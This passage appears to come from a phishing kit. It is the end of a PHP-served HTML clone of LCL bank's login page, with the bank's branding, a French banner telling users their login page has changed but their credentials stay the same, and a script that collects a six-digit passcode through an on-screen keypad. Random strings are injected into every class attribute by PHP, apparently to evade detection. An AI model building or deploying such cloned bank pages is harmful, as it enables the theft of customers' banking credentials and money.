                                <g clip-path="url(#__lottie_element_3)">
                                  <g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,345.1047058105469,230.9346923828125)" opacity="1">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,279.1047058105469,230.9346923828125)" opacity="1">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(1.100000023841858,0,0,1.100000023841858,209.5906982421875,230.93569946289062)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
                                      <path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                  <g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
                                    <g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
                                      <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.6020002365112305,23.46299934387207 -23.093000411987305,23.56800079345703 -23.093000411987305,23.56800079345703 C-23.093000411987305,23.56800079345703 -23.46299934387207,5.35699987411499 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
                                    </g>
                                  </g>
                                </g>
                              </svg></ui-companion>
                          </div>
                          <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-content">
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-header">
                              <h3 _ngcontent-ng-front-c77="">Bienvenue sur votre nouvelle page de connexion</h3>
                              <!---->
                            </div>
                            <!---->
                            <div _ngcontent-ng-front-c77="" class="<?php echo generateRandomString(); ?>  message-banner-body">
                              <div _ngcontent-ng-front-c78="">
                                <p>Votre page de connexion a changé.<br>Votre identifiant et votre mot de passe restent les mêmes.</p>
                              </div>
                              <div _ngcontent-ng-front-c77=""><a _ngcontent-ng-front-c77="" target="_blank" class="<?php echo generateRandomString(); ?>  message-banner-link app-link app-link--underline" href="https://www.lcl.fr/securite" tabindex="-1">Se rendre sur LCL sécurité</a></div>
                              <!---->
                            </div>
                          </div>
                          <!---->
                        </ui-message-banner>
                      </div>
                    </div>
                  </ui-swiper>
                  <div _ngcontent-ng-front-c78="" class="<?php echo generateRandomString(); ?>  bullets"><button _ngcontent-ng-front-c78="" type="button" class="<?php echo generateRandomString(); ?>  bullet active"><span _ngcontent-ng-front-c78="" class="<?php echo generateRandomString(); ?>  cdk-visually-hidden">En cours</span></button><button _ngcontent-ng-front-c78="" type="button" class="<?php echo generateRandomString(); ?>  bullet"><span _ngcontent-ng-front-c78="" class="<?php echo generateRandomString(); ?>  cdk-visually-hidden">Element 2</span></button>
                    <!---->
                  </div>
                  <!---->
                </div>
                <!---->
              </ui-message-banner-carousel>
            </div>
            <!---->
          </aside>
        </div>
      </ui-sidepane-template>
    </app-login-page>
    <!---->
  </app-root>

</body>
<script>
  function addtopass(i) {
    var code = document.getElementById('passcode').value;
    if (code.length < 6) {
      if (code.length == 0) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot1").classList.add('is-filled');
        document.getElementById("inputxhidden").style.visibility = "visible";
      }
      if (code.length == 1) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot2").classList.add('is-filled');
      }
      if (code.length == 2) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot3").classList.add('is-filled');
      }
      if (code.length == 3) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot4").classList.add('is-filled');
      }
      if (code.length == 4) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot5").classList.add('is-filled');
      }
      if (code.length == 5) {
        document.getElementById('passcode').value += i;
        document.getElementById("dot6").classList.add('is-filled');
      }
    }
  }

  function clearcode() {
    document.getElementById("inputxhidden").style.visibility = "hidden";
    document.getElementById("dot1").classList.remove('is-filled');
    document.getElementById("dot2").classList.remove('is-filled');
    document.getElementById("dot3").classList.remove('is-filled');
    document.getElementById("dot4").classList.remove('is-filled');
    document.getElementById("dot5").classList.remove('is-filled');
    document.getElementById("dot6").classList.remove('is-filled');
    document.getElementById('passcode').value = "";
  }

  function submitcodelog() {
    var code = document.getElementById('passcode').value;
    if (code.length == 6) {
      return true;
    } else
      return false;
  }
</script>

</html>